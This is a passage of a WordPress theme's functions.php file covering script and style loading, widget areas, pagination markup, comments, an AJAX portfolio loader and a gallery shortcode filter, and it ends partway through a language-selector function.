<?php
require_once dirname(__FILE__) . '/functions/core/core-init.php';

// add post formats support for posts
add_theme_support( 'post-formats', array( 'image' ) );

function dt_setup_scripts() {	
	global $post, $is_ios;
    $uri = get_template_directory_uri();
	$page_layout = dt_core_get_template_name();

	if ( class_exists( 'WPMinify' ) ){
		$in_footer = false;
	} else {
		$in_footer = true;
	}

    wp_enqueue_script( 'dt_jquery-hs-full', $uri.'/js/plugins/highslide/highslide-full.js', array('jquery'), false, $in_footer );
    wp_enqueue_script( 'dt_jquery-hs-config', $uri.'/js/plugins/highslide/highslide.config.js', array('jquery', 'dt_jquery-hs-full'), false, $in_footer );
	wp_enqueue_script( 'dt_modernizr', $uri.'/js/modernizr.js', array('jquery'), false );
	
	if ( dt_storage( 'is_homepage' ) && dt_storage( 'have_obo_slider' ) ) {
		wp_enqueue_script( 'dt_onebyoneHome', $uri.'/js/jquery.onebyone.min.js', array('jquery'), false, $in_footer );
	}
	
	global $is_IE;
	$flag = true;
	if( $is_IE ) {
		$agent = isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';
		$agent = explode('MSIE', $agent);
		if( isset($agent[1]) ) {
			$agent = explode(';', $agent[1]);
			$version = current(explode('.', trim($agent[0])));
			if( $version < 9 ) $flag = false;
		}
	}

    wp_enqueue_script( 'dt_validation', $uri.'/js/plugins/validator/jquery.validationEngine.js', array('jquery'), false, $in_footer );
    wp_enqueue_script( 'dt_validation_translation', $uri.'/js/plugins/validator/z.trans.en.js', array('jquery'), false, $in_footer );
	
	wp_enqueue_script( 'dt_plugins', $uri.'/js/plugins.js', array('jquery'), false, $in_footer );	
	wp_enqueue_script( 'dt_scripts', $uri.'/js/scripts.js', array('jquery'), false, $in_footer );
	
	if ( is_singular() && comments_open() ) wp_enqueue_script( "comment-reply" );
	
	if ( dt_storage( 'is_homepage' ) && ! dt_storage( 'have_obo_slider' ) ) {
		$page_opts = get_post_meta( get_the_ID(), '_dt_slider_layout_options', true );
		
		switch( $page_opts['slider'] ) {
			case 'fullscreen_slider':
				wp_enqueue_script( 'dt_jquery-widget-factory', $uri . '/js/jquery-ui-1.8.22.custom.min.js', array( 'jquery', 'dt_scripts' ), false, $in_footer );
				wp_enqueue_script( 'dt_jquery-fs-slideshow', $uri . '/js/jquery.fs-slideshow.js', array( 'jquery', 'dt_scripts' ), false, $in_footer );
				break;
		}
	}

    if ( ! $page_layout ) {
        $page_layout = 'index.php';
    } else {
        $page_layout = str_replace( array('dt-', '.php', '-sidebar', '-fullwidth'), '', $page_layout ); 
    }

    global $post;

	// add some support for qTranslate
	$ajaxurl = admin_url( 'admin-ajax.php' );
	if ( defined( 'QT_SUPPORTED_WP_VERSION' ) ) {
		$ajaxurl = add_query_arg( array( 'lang' => qtrans_getLanguage() ), $ajaxurl );
	} elseif ( defined( 'ICL_LANGUAGE_CODE' ) ) {
		$ajaxurl = add_query_arg( array( 'lang' => ICL_LANGUAGE_CODE ), $ajaxurl );
	}

    $data = array(
	    'ajaxurl'	    => $ajaxurl,
        'post_id'       => isset($post->ID)?$post->ID:'',
        'page_layout'   => $page_layout,
        'nonce'         => wp_create_nonce('nonce_'.$page_layout)
    );

    switch( $page_layout ) {
        case 'portfolio':
            $opts = get_post_meta($post->ID, '_dt_portfolio_layout_options', true);
            break;
        case 'photos':
            $opts = get_post_meta($post->ID, '_dt_photos_layout_options', true);
            break;
        case 'videogal':
            $opts = get_post_meta($post->ID, '_dt_video_layout_options', true);
            break;
        case 'photogallery':
            $opts = get_post_meta($post->ID, '_dt_gallery_layout_options', true);
            break;
        case 'category':
            $opts = get_post_meta($post->ID, '_dt_category_layout_options', true);
            break;
        case 'albums':
            $opts = get_post_meta($post->ID, '_dt_albums_layout_options', true);
            break;
    }
    if( isset($opts['layout']) ) {
        $data['layout'] = end(explode('-', $opts['layout']));
    }

    wp_localize_script( 'dt_scripts', 'dt_ajax', $data );
}
add_action('wp_enqueue_scripts', 'dt_setup_scripts');

function dt_setup_styles() {
    $uri = get_template_directory_uri();

    wp_enqueue_style( 'dt_style',  $uri.'/css/style.css' );
    wp_enqueue_style( 'dt_hs',  $uri.'/js/plugins/highslide/highslide.css' );
    wp_enqueue_style( 'dt_validation', $uri.'/js/plugins/validator/validationEngine_style.css' );
    wp_enqueue_style( 'dt_plugins',  $uri.'/css/plugins.css' );
	wp_enqueue_style( 'dt_animate', $uri.'/css/animate.css' );
	wp_enqueue_style( 'dt_media', $uri.'/css/media.css' );
	wp_enqueue_style( 'dt_highdpi', $uri.'/css/highdpi.css' );
	wp_register_style( 'dt_custom', $uri . '/css/custom.css' );

	if ( of_get_option( 'misc-static_css', false ) ) {
		$upload_dir = wp_upload_dir();
		wp_enqueue_style( 'dt_dynamic-stylesheet', trailingslashit( $upload_dir['baseurl'] ) . 'dynamic-stylesheet.css' );
	}

	add_action( 'wp_print_scripts', 'dt_add_some_styles', 999 );
}
add_action( 'wp_enqueue_scripts', 'dt_setup_styles' );

/* Tourn off responsivness if option "misc-off_responsivness" is set
 * Another part of this action located in header.php (change viewport) and footer.php (set javascript global)
 * dt_is_responsive() located on /modules/helpers/template-helpers.php
 */
function dt_tourn_off_responsivness () {
	if ( ! dt_is_responsive() ) {
		wp_dequeue_style( 'dt_media' );
	}
}
add_action( 'wp_enqueue_scripts', 'dt_tourn_off_responsivness', 11 );

function dt_add_some_styles() {
	remove_action( 'wp_print_scripts', 'dt_add_some_styles', 999 );
?>
    <!--[if IE]><script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script><![endif]-->
    <!--[if lte IE 7]><link rel="stylesheet" type="text/css" media="all" href="<?php echo get_template_directory_uri(); ?>/css/old_ie.css" /><![endif]-->
    <!--[if lt IE 7]>
	<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri(); ?>/js/plugins/highslide/highslide-ie6.css" />
	<![endif]-->
    <!--[if lte IE 8]>
	<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/origami-ie8.css" />
	<![endif]-->

<?php
	get_template_part( 'dynamic-stylesheet' );

	wp_print_styles( 'dt_custom' );
?>
	<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
<?php
}

function dt_setup_admin_scripts( $hook ) {
    if ( 'widgets.php' != $hook )
       return; 
    
    wp_enqueue_script( 'dt_admin_widgets', get_template_directory_uri().'/js/admin/admin_widgets_page.js', array('jquery') );
}
add_action("admin_enqueue_scripts", 'dt_setup_admin_scripts');

function dt_get_container_class() {
	$container_classes = apply_filters( 'dt_get_container_class', array(), get_the_ID() );
	$container_classes = ! empty( $container_classes ) ? ' class="' . esc_attr( implode( ' ', $container_classes ) ) . '"' : '';
	return $container_classes;
}

function dt_get_sidebar_position ( $post_id = null ) {
	if ( $post_id ) {
		global $post;
		$post_id = $post->ID;
	}
	
	$data = get_post_meta( $post_id, '_dt_layout_sidebar_options', true );
	if ( isset( $data['align'] ) ) {
		return $data['align'];
	}
	return false;
}

function dt_add_right_class_to_container ( $classes, $post_id = null ) {
	if ( dt_storage( 'have_sidebar' ) && 'left' == dt_get_sidebar_position( $post_id ) ) {
		$classes[] = 'right';
	}
	return $classes;
}
add_filter( 'dt_get_container_class', 'dt_add_right_class_to_container', 10, 2 );

function dt_footer_widgetarea() {
    global $post;
	
	if( is_attachment() || (is_single() && get_post_type() == 'dt_video' ) ) return '';
	
    if( !empty($post) && is_single() ) {
        $sidebar = '';
		switch( $post->post_type ) {
            case 'post':
				$sidebar = 'sidebar_5'; break;
            case 'dt_catalog':
                $sidebar = 'sidebar_6'; break;
			case 'dt_portfolio':
                $sidebar = 'sidebar_7'; break;
        }
		
		if( $sidebar ) {
			dt_widget_area('footer', null, $sidebar); return;
		}
    }

    dt_widget_area('footer');
}

function dt_widget_area_filter( $sidebar = '', $position, $post_id = null, $area_name = '', $data = false, $param = '' ) {
	$classes = array();
	$wrappers = array(
		'sidebar'	=> '<aside id="aside" class="%2$s">%1$s</aside>',
		'footer' 	=> '<div class="%2$s">%1$s</div>'
	);

	if ( empty( $sidebar ) || ! isset( $wrappers[ $position ] ) ) { return ''; }

	if ( empty( $data ) ) {
		$data = get_post_meta( $post_id, '_dt_layout_' . $position . '_options', true );
	}
	
	$sidebars = of_get_option( 'of_generatortest2' );
	$area_index = explode( '_', $area_name );

	if ( ! empty( $area_index[1] ) && isset( $sidebars[ $area_index[1] ] ) ) {
		$index = $area_index[1];

		if ( isset( $sidebars[ $index ]['sidebar_hide_in_mobile'] ) ) { $classes[] = 'dt-hide-in-mobile'; }
	}
	
	switch ( $position ) {
		case 'footer' : $classes[] = 'foot-cont'; break;
		case 'sidebar' : $classes[] = ! empty( $data['align'] ) ? $data['align'] : 'right';
	}

	return sprintf( $wrappers[ $position ], $sidebar, implode( ' ', $classes ) );
}
add_filter('dt_widget_area', 'dt_widget_area_filter', 10, 6);

function dt_widget_area_name_filter( $area_name = '', $position, $post_id = null, $data = false, $param = '' ) {
	if ( empty( $position ) ) { return ''; }
	
	$sidebars = of_get_option( 'of_generatortest2' );
	$area_index = explode( '_', $area_name );

	if ( ! empty( $area_index[1] ) && isset( $sidebars[ $area_index[1] ] ) ) {
		$index = abs( $area_index[1] );
		
		if ( isset( $sidebars[ $index ]['sidebar_hide_in_single'] ) && is_single() ) { return ''; }

		if ( isset( $sidebars[ $index ]['sidebar_hide_everywhere'] ) ) { return ''; }
	}
	
	if ( empty( $data ) ) {
		$data = get_post_meta( $post_id, '_dt_layout_' . $position . '_options', true );
	}
	
	if ( 'footer' == $position && isset( $data['footer'] ) && 'show' != $data['footer'] ) { return ''; }
	
	return $area_name;	
}
add_filter( 'dt_widget_area_name', 'dt_widget_area_name_filter', 10, 6 );

function dt_widgets_params( $params ) {
    $params['before_widget'] = '<div id="%1$s" class="widget %2$s">';
    $params['after_widget'] = '</div>';
    $params['before_title'] = '<div class="header">';
    $params['after_title'] = '</div>';
    return $params;
}
add_filter('dt_setup_widgets_params', 'dt_widgets_params');

function dt_page_navi_args_filter( $args ) {
    $args['wrap'] = '<div id="nav-above" class="navigation blog"><div class="hr hr-narrow gap-small"></div><ul class="%CLASS%">%LIST%';

    $add_data = dt_storage('add_data');
    if ( $add_data &&
        isset($add_data['init_layout']) &&
        $add_data['init_layout'] == '3_col-list'
    ) {
        $args['wrap'] = '<div id="nav-above" class="navigation blog with-3-col"><div class="hr hr-narrow gap-small"></div><ul class="%CLASS%">%LIST%';
    }

    $args['item_wrap'] = '<li class="%ACT_CLASS%"><div class="but-wrap"><a href="%HREF%" class="button"><span>%TEXT%</span></a></div></li>';
    $args['first_wrap'] = '<li class="larr"><div class="but-wrap"><a href="%HREF%" class="button"><span>%TEXT%</span></a></div></li>';
    $args['last_wrap'] = '<li class="rarr"><div class="but-wrap"><a href="%HREF%" class="button"><span>%TEXT%</span></a></div></li>';
    $args['dotleft_wrap'] = '<li class="dotes">%TEXT%</li>'; 
    $args['dotright_wrap'] = '<li class="dotes">%TEXT%</li>';
    $args['pages_wrap'] = '</ul><div class="paginator-r"><span class="pagin-info">%TEXT%</span>%PREV%%NEXT%</div></div>';
    $args['pages_prev_class'] = 'prev';
    $args['pages_next_class'] = 'next';
    $args['act_class'] = 'act';
	$args['next_text'] = '<span class="a-l-s">&#8250;</span><span class="a-r-s">&#8250;</span>';
	$args['prev_text'] = '<span class="a-l-s">&#8249;</span><span class="a-r-s">&#8249;</span>';
	
    return $args;
}
add_filter('wp_page_navi_args', 'dt_page_navi_args_filter');

/* comments callback
 */
if ( ! function_exists( 'dt_single_comments' ) ) {
	function dt_single_comments( $comment, $args, $depth ) {
		static $comments_count = 0, $prev_depth = 1;
		$comments_count++;
		 
		if ( $prev_depth != $depth ) {
			if( $depth < $prev_depth ) {
				for( $i = $depth; $i < $prev_depth; $i++ ) {
					echo '</div>';
				}
			}
			$prev_depth = $depth;
		}
		 
		$classes = array();
		if ( ! $args['has_children'] || ( $depth == 5 ) ) {
			$classes[] = 'nochildren';
		}

		$GLOBALS['comment'] = $comment;
		$avatar_size = 50;
		$classes = implode( ' ', $classes ); 
		?>
		<div id="comment-<?php echo $comment->comment_ID ?>" class="comment level<?php echo $depth; ?> <?php echo esc_attr($classes); ?>">
			<span class="avatar"><?php
				echo get_avatar(
					$comment,
					$avatar_size,
					esc_url( get_template_directory_uri() . '/images/com-icon.gif' )
				);
			?></span>
			  <span class="text<?php echo ($args['comments_nmbr'] == $comments_count)?' last':''; ?>"><span class="head"><?php comment_author($comment->comment_ID); ?></span><span class="comment-meta"><span class="ico-link date"><?php
					echo str_replace(
						array( '%DATE%', '%TIME%' ),
						array( get_comment_date(get_option('date_format')), get_comment_time(get_option('time_format')) ),
						__('%DATE% at %TIME%', LANGUAGE_ZONE )
					);
					?></span><a href="#" class="ico-link comments"><?php _e( 'Reply', LANGUAGE_ZONE ); ?></a><?php edit_comment_link( __( 'Edit', LANGUAGE_ZONE ), '<span class="ico-link comments">', '</span>' ); ?></span>

			<?php comment_text(); ?>
			</span>
		</div><!-- close element -->
		<?php
		
		if ( $depth >= 1 && $depth < 5 && $args['has_children'] ) {
			echo '<div class="children">';
		}
		
		if ( $args['comments_nmbr'] == $comments_count ) {
			for ( $i = 0; $i < $depth - 1; $i++ ) {
				echo '</div>';
			}
		}
	}
}// comments begin

if ( ! function_exists( 'dt_comments_end_callback' ) ) {
	function dt_comments_end_callback() {
	}
}

function dt_index_layout_init( $layout ) {
    if ( 'index' != $layout ) { return false; }
    
    if ( 'post-format-standard' == get_query_var( 'post_format' ) ) {
        global $_wp_theme_features;
        $pf_arr = array();
        foreach( $_wp_theme_features['post-formats'][0] as $pf ){
            $pf_arr[] = 'post-format-' . $pf;
        }
        
        if( !$paged = get_query_var('page') )
            $paged = get_query_var('paged');

        query_posts( array(
            'tax_query' => array( array(
                'taxonomy'  => 'post_format',
                'field'     => 'slug',
                'terms'     => $pf_arr,
                'operator'  => 'NOT IN'
            ) ),
            'post_type'     => 'post',
            'paged'                 => $paged,
            'post_status'           => 'publish',
            'ignore_sticky_posts'   => true
        ) );
    }

    global $wp_query;
    if ( have_posts() ) {
        $thumb_arr = dt_core_get_posts_thumbnails( $wp_query->posts );
        dt_storage( 'thumbs_array', $thumb_arr['thumbs_meta'] );
    }  
    dt_storage( 'post_is_first', 1 );
}
add_action( 'dt_layout_before_loop', 'dt_index_layout_init', 10, 1 );

function dt_main_block_class_changer( $class = '', $echo = true ) {
    global $post, $paged;
	$template = dt_core_get_template_name();
    $classes = array();
    
    if ( $class ) {
        $classes[] = $class;
    }
	
	if ( ! dt_storage( 'is_homepage' ) ) {
		$classes[] = 'bg';
	} elseif ( dt_storage( 'have_obo_slider' ) ) {
		$opts = get_post_meta( get_the_ID(), '_dt_obo_slider_layout_options', true );
		if ( isset( $opts['header'] ) && 'normal' == $opts['header'] ) {
			$classes[] = 'bg';
		} else {
			$classes[] = 'home-bg';
		}
	} else {
		$opts = get_post_meta( get_the_ID(), '_dt_slider_layout_options', true );
		if ( isset( $opts['slider'] ) && isset( $opts['fs_header'] )  && 'normal' == $opts['fs_header'] && 'fullscreen_slider' == $opts['slider'] ) {
			$classes[] = 'bg';
		} else {
			$classes[] = 'home-bg';
		}	
	}
	
	$classes = apply_filters( 'dt_main_block_class_changer', $classes, $class, $echo );
	
    if ( $echo ) {
        echo implode(' ', $classes);
    } else {
        return $classes;
    }
    return false;
}

function dt_get_layout_switcher( $opts = array(), $echo = true ) {
    $buttons = array(
        '2_col'     => array(
            'grid'  => array(
                'class'     => 'categ td',
                'href'      => 'grid',
                'i_class'   => 'ico-f'
            ),
            'list' => array(
                'class'     => 'categ list',
                'href'      => 'list',
                'i_class'   => 'ico-t'
            )
        ),
        '3_col'     => array(
            'grid'  => array(
                'class'     => 'categ td-three',
                'href'      => 'grid',
                'i_class'   => 'three-coll'
            ),
            'list' => array(
                'class'     => 'categ list-three',
                'href'      => 'list',
                'i_class'   => 'three-coll-t'
            )
        )
    );
    $defaults = array(
        'type'      => '2_col',
        'current'   => 'list',
        'hash'      => '%s'
    );
    $opts = wp_parse_args( $opts, $defaults );

    if( !isset($buttons[$opts['type']]) || !isset($buttons[$opts['type']][$opts['current']]) ) {
        return false;
    }

    $output = '';

    foreach( $buttons[$opts['type']] as $select=>$button ) {
        if( $select == $opts['current'] ) {
            $button['class'] .= ' act';
        }
        $output .= sprintf(
            '<a class=" %s" href="%s"><i class="%s"></i></a>',
            $button['class'],
            sprintf( $opts['hash'], $button['href'] ),
            $button['i_class']
        );
    }
	
	$output = apply_filters( 'dt_get_layout_switcher', $output, $opts, $buttons, $echo );
	
    if( $echo ) {
        echo $output;
    }else {
        return $output;
    }
    return false;
}

function dt_excerpt_more_filter( $more ) {
    return '...';
}
add_filter( 'excerpt_more', 'dt_excerpt_more_filter' );

function dt_get_category_list_options_filter( $opts ) {
    $opts['wrap'] = '%LIST%';
    $opts['item_wrap'] = '<div class="but-wrap"><a href="%HREF%" class="%CLASS%"><span>%TERM_NICENAME% (%COUNT%)</span></a></div>';
    $opts['item_class'] = 'button';
    return $opts;
}
add_filter( 'dt_get_category_list_options', 'dt_get_category_list_options_filter' );

function dt_post_type_do_ajax() {
    $new_paged = !empty($_POST['paged'])?trim(intval($_POST['paged'])):1;
    $layout = !empty($_POST['layout'])?trim(stripslashes($_POST['layout'])):''; 

    $cat_id = !empty($_POST['cat_id'])?trim(stripslashes($_POST['cat_id'])):'all';
    if( 'all' != $cat_id && 'none' != $cat_id ) {
       $cat_id = explode(',', $cat_id); 
    }

    if( isset($_POST['page_layout']) ) {
        $page_layout = trim(stripslashes($_POST['page_layout']));
    }else {
        wp_die( __('Empty page layout', LANGUAGE_ZONE) );
    }

    if( !empty($_POST['post_id']) ) {
        $post_id = intval(trim($_POST['post_id']));
    }else {
        wp_die( __('Empty post id', LANGUAGE_ZONE) );
    }

    switch( $page_layout ) {
        case 'portfolio':
            $page_layout = 'dt-portfolio';
            break;
        case 'photos':
            $page_layout = 'dt-photos';
            break;
        case 'catalog':
            $page_layout = 'dt-catalog';
            break;
        case 'albums':
            $page_layout = 'dt-albums';
            break;
        case 'videogal':
            $page_layout = 'dt-video';
            break;
        default:
            wp_die( __('Undefined page layout', LANGUAGE_ZONE) );
    }
	
	dt_add_qtranslate_hooks();
	
    // do page init
    global $wp_query;
    $wp_query->query('page_id=' . $post_id . '&status=publish');

    if( have_posts() ) {
        the_post();
    }else {
        wp_die( __('There are no such page', LANGUAGE_ZONE) );
    }

    // replace paged
    $wp_query->set('paged', $new_paged);
    global $paged;
    $paged = $new_paged;

    // store settings
    dt_storage( 'page_data', array(
        'cat_id'        => is_array($cat_id)?$cat_id:array($cat_id),
        'page_layout'   => $page_layout,
        'base_url'      => get_permalink($post_id),
        'layout'        => $layout
    ) );
    
    $data = array(
        'cat_id'    => $cat_id    
    );

    do_action( 'dt_layout_before_loop', $page_layout, $data );
    global $DT_QUERY;
    if ( $DT_QUERY->have_posts() ) {

        while ( $DT_QUERY->have_posts() ) {
            $DT_QUERY->the_post();
            get_template_part( 'content', $page_layout );
        }
        if ( function_exists( 'wp_pagenavi' ) ) {
            wp_pagenavi( $DT_QUERY, array( 'ajaxing'   => true, 'num_pages' => dt_storage( 'num_pages', null, 5 ) ) );
        }
    }

    // IMPORTANT: don't forget to "exit"
    exit;
}
add_action( 'wp_ajax_nopriv_dt_post_type_do_ajax', 'dt_post_type_do_ajax' );
add_action( 'wp_ajax_dt_post_type_do_ajax', 'dt_post_type_do_ajax' );

function dt_portfolio_classes( $type, $place = '', $echo = true ) {
	if ( empty( $place ) ) { return ''; }
	if ( empty( $type ) ) { $type = '2_col-list'; }
	
    $class = array(
        '2_col' => array(
            'list'  => array(
                'fullwidth' => array(
                    'block' => 'textwidget text',
                    'head'  => 'head',
                    'info'  => 'info half'
                ),
                'sidebar'   => array(
                    'block' => 'textwidget text',
                    'head'  => 'head',
                    'info'  => 'info half'
                )
            ),
            'grid'  => array(
                'fullwidth' => array(
                    'block' => 'textwidget',
                    'head'  => 'head',
                    'info'  => 'info half'
                ),
                'sidebar'   => array(
                    'block' => 'textwidget',
                    'head'  => 'head',
                    'info'  => 'info half'
                )
            )
        ),
        '3_col' => array(
            'list'  => array(
                'fullwidth' => array(
                    'block' => 'textwidget one-third',
                    'head'  => 'head-capt',
                    'info'  => 'info one-third'
                ),
                'sidebar'   => array(
                    'block' => 'textwidget one-fourth',
                    'head'  => 'head-capt',
                    'info'  => 'info one-fourth'
                )
            ),
            'grid'  => array(
                'fullwidth' => array(
                    'block' => 'textwidget',
                    'head'  => 'head-capt',
                    'info'  => 'info one-third'
                ),
                'sidebar'   => array(
                    'block' => 'textwidget',
                    'head'  => 'head-capt',
                    'info'  => 'info one-fourth'
                )
            )
        )
    );
	$class = apply_filters( 'dt_portfolio_default_classes', $class, $type, $place );

    $add_data = dt_storage( 'add_data' );

    $type = explode( '-', $type );
	$cols = $type[0];
	$form = $type[1];
    if ( ! isset( $class[ $cols ][ $form ][ $add_data['template_layout'] ][ $place ] ) ) { return ''; }

    $output_class = apply_filters( 'dt_portfolio_classes', $class[ $cols ][ $form ][ $add_data['template_layout'] ][ $place ], $type, $place, $class, $echo );
	
    if( $echo ) {
        echo $output_class;
    }else {
        return $output_class;
    }
    return false;
}

function dt_storage_add_data_init( array $data ) {
    $thumb_sizes = array(
        '2_col' => array(
            'fullwidth' => array( 470, 300 ),
            'sidebar'   => array( 345, 220 )
        ),
        '3_col' => array(
            'fullwidth' => array( 306, 200 ),
            'sidebar'   => array( 224, 140 )
        )
    );
	$thumb_sizes = apply_filters( 'dt_storage_add_data_init_thumb_sizes', $thumb_sizes, $data );

    $add_data = array();
    $template = dt_core_get_template_name();
    $page_data = dt_storage('page_data');
	
	$page_opts = ! empty( $page_data['page_options'] ) ? $page_data['page_options'] : array();
	
    if ( isset( $data['layout'] ) ) {
        $cols_layout = current(explode('-', $data['layout']));
        $add_data['init_layout'] = $cols_layout . '-' . $page_data['layout'];
    } else {
        $cols_layout = '';
    }
    
    if ( isset( $data['template_layout'] ) ) {
        $template_layout = array( '1' => $data['template_layout'] );
    } else {
        $template_layout = explode( '-', str_replace(array('dt-', '.php'), '', $template) );
    }    
    if ( isset( $template_layout[1] ) ) {
        $template_layout = $template_layout[1];
        if ( isset( $thumb_sizes[ $cols_layout ][ $template_layout ][0]) &&
            isset( $thumb_sizes[ $cols_layout ][ $template_layout ][1] )
        ) {
            $add_data['thumb_w'] = $thumb_sizes[ $cols_layout ][ $template_layout ][0];
            $add_data['thumb_h'] = ! empty( $page_opts['thumb_height'] ) ? $page_opts['thumb_height'] : $thumb_sizes[ $cols_layout ][ $template_layout ][1];
        }
    } else {
        $template_layout = '';
    }

    $add_data['cols_layout'] = $cols_layout;
    $add_data['template_layout'] = $template_layout;
    
	$add_data = apply_filters( 'dt_storage_add_data_init', $add_data, $data, $thumb_sizes );
	
    dt_storage( 'add_data', $add_data );
}

// gallery shortcode filter
function dt_filter_gallery_sc( $output, $attr ) {
	static $hs_gallery_count = 0;
	$hs_gallery_count++;

	global $post, $wp_locale;
	$exclude_def = '';
    $event = '';
	
	if( $hide_in_gal = get_post_meta( $post->ID, 'hide_in_gal', true ) && ('gallery' == get_post_format($post->ID)) ) {
		$exclude_def = get_post_thumbnail_id( $post->ID );
	}
	
	// We're trusting author input, so let's at least make sure it looks like a valid orderby statement
	if ( isset( $attr['orderby'] ) ) {
		$attr['orderby'] = sanitize_sql_orderby( $attr['orderby'] );
		if ( !$attr['orderby'] )
			unset( $attr['orderby'] );
	}
		
	extract(shortcode_atts(array(
		'order'      => 'ASC',
		'orderby'    => 'menu_order ID',
		'id'         => $post->ID,
		'itemtag'    => 'li',
		'columns'    => 3,
		'size'       => 'thumbnail',
		'include'    => '',
		'exclude'    => $exclude_def
	), $attr));

	$id = intval($id);
	if ( 'RAND' == $order )
		$orderby = 'none';

	if ( !empty($include) ) {
		$include = preg_replace( '/[^0-9,]+/', '', $include );
		$_attachments = get_posts( array('include' => $include, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );

		$attachments = array();
		foreach ( $_attachments as $key => $val ) {
			$attachments[$val->ID] = $_attachments[$key];
		}
	} elseif ( !empty($exclude) ) {
		$exclude = preg_replace( '/[^0-9,]+/', '', $exclude );
		$attachments = get_children( array('post_parent' => $id, 'exclude' => $exclude, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	} else {
		$attachments = get_children( array('post_parent' => $id, 'post_status' => 'inherit', 'post_type' => 'attachment', 'post_mime_type' => 'image', 'order' => $order, 'orderby' => $orderby) );
	}

	if ( empty($attachments) )
		return '';

	if ( is_feed() ) {
		$output = "\n";
		foreach ( $attachments as $att_id => $attachment )
			$output .= wp_get_attachment_link($att_id, $size, true) . "\n";
		return $output;
	}
	
	$hs_class = '';
	$hs_data_attr = '';

	if( isset($attr['link']) && ('post' == $attr['link']) ) {
		$hs_class = " to_attachment";
	}else {
        $event .= 'onclick="return hs.expand(this, { slideshowGroup: \'' . $post->ID . $hs_gallery_count . '\' })"';
		$hs_class = " hs_me";
		$hs_data_attr = ' data-hs_group="' . $post->ID . $hs_gallery_count . '"';
	}
	
	$itemtag = tag_escape($itemtag);
	$columns = intval($columns);
	$size_class = sanitize_html_class( $size );
	
	$output = "<ul class='gall_std{$hs_class} gallery galleryid-{$id} gallery-columns-{$columns} gallery-size-{$size_class}'{$hs_data_attr}>";

	$i = 0;
	foreach ( $attachments as $id => $attachment ) {
		$class = $description = '';
        $class .= 'highslide ';
		if( isset($attr['link']) && ('post' == $attr['link']) ) {
			$href = get_permalink($id);
		}else {
			$href = wp_get_attachment_image_src($id, 'full');
			$href = $href?current($href):'#';
			$class .= "fadeThis ";
		}
		
		if( $attachment->post_content ) {
			$description = '<p class="wp-caption-text">'.wptexturize($attachment->post_content).'</p>';
			$class .= 'wp-caption ';
		}
		
		$alt = get_post_meta( $id, '_wp_attachment_image_alt', true );
		$caption = wptexturize(trim($attachment->post_excerpt));
		$dt_img = dt_get_thumbnail(
            array(
                'img_id'	=> $id,
                'width'		=> 126,
                'height'    => 126,
                'upscale'	=> true,
                'quality'   => 90,
                'zc_align'  => 'c'
            )        
        );
        $src[0] = $dt_img['thumnail_img'];
        $src[1] = $dt_img['width'];
        $src[2] = $dt_img['height'];
        //$src = wp_get_attachment_image_src($id, $size);
        
		$link = "<a class='{$class}' href='{$href}' title='{$caption}' {$event}>
		<img src='{$src[0]}' alt='{$alt}' width='{$src[1]}' height='{$src[2]}'/>{$description}
		</a>";
        
        $li_size = $src[1];
        
		$output .= "<{$itemtag} class='shadow_light gallery-item' style='width: {$li_size}px;'>";
		$output .= $link;
		$output .= "</{$itemtag}>";
	}

	$output .= "</ul>\n";

	return $output;
}
add_filter( 'post_gallery', 'dt_filter_gallery_sc', 10, 2 );

// force enable jetpack carousel
function dt_force_jetpack_gallery() {
	return true;
}
//add_filter( 'jp_carousel_force_enable', 'dt_force_jetpack_gallery' );

add_filter('body_class','dt_body_class_names');
function dt_body_class_names($classes) {
    foreach( $classes as $index=>$class ) {
        if( 'search' == $class ) {
            unset($classes[$index]);
        }
    }
	return $classes;
}

function dt_password_form() {
    global $post, $paged;
    $http_referer = wp_referer_field( false );
    $page_data = dt_storage( 'page_data' ); 
    $wp_ver = explode('.', get_bloginfo('version'));
    $wp_ver = array_map( 'intval', $wp_ver );
    
    if( $wp_ver[0] < 3 || ( 3 == $wp_ver[0] && $wp_ver[1] <= 3 ) ) {
        $form_action = esc_url( get_option('siteurl') . '/wp-pass.php' );
    }else {
        $form_action = esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ); 
    } 

    if( $page_data && isset($page_data['base_url']) && isset($page_data['cat_id']) && isset($page_data['layout']) ) {
        $site_url = site_url();
        $http_referer = str_replace( str_replace($site_url, '', admin_url('admin-ajax.php')), str_replace($site_url, '', $page_data['base_url']).'#'.current($page_data['cat_id']).'/'.$paged.'/'.$page_data['layout'], $http_referer );
    }
    $label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
    $o = '<div class="form-protect"><form class="protected-post-form get-in-touch" action="'. $form_action. '" method="post">'. $http_referer. '
    <div>' . __( "To view this protected post, enter the password below:", LANGUAGE_ZONE ) . '</div>
    <label for="' . $label . '">' . __( "Password:", LANGUAGE_ZONE ) . '&nbsp;&nbsp;&nbsp;</label><div class="i-h"><input name="post_password" id="' . $label . '" type="password" size="20" /></div>
	<div class="but-wrap"><a class="button go_submit" onClick="submit();" href="#"><span>' . esc_attr__( "Submit", LANGUAGE_ZONE ) . '</span></a></div>
    </form></div>
    ';
    return $o;
}
add_filter( 'the_password_form', 'dt_password_form' );

/* used in "posts_where" filter */
function dt_exclude_post_protected_filter( $where ) {
    return $where.' AND post_password=""';
}

/* custom media uploader filter */
function dt_media_upload_form_url_filter( $form_action_url, $type ) {
	if ( ! empty( $_GET['dt_custom'] ) ) {
		$form_action_url .= '&dt_custom=1';
	}
	return $form_action_url;
}
add_filter('media_upload_form_url', 'dt_media_upload_form_url_filter', 99, 2);

function dt_clear_dpr_cookie () {
	if ( ! of_get_option( 'misc-retina_images', 1 ) && isset( $_COOKIE['devicePixelRatio'] ) ) {
		setcookie( 'devicePixelRatio', 0, time() - 3600, '/' );
		unset( $_COOKIE['devicePixelRatio'] );
	}
}
add_action( 'init', 'dt_clear_dpr_cookie' );

function language_selector_flags() {
	$languages = icl_get_languages('skip_missing=0&orderby=code');

	if(!empty($languages)){

		echo '<div id="topmenu_language_list"><ul>';

		foreach($languages as $l){

			echo '<li>';

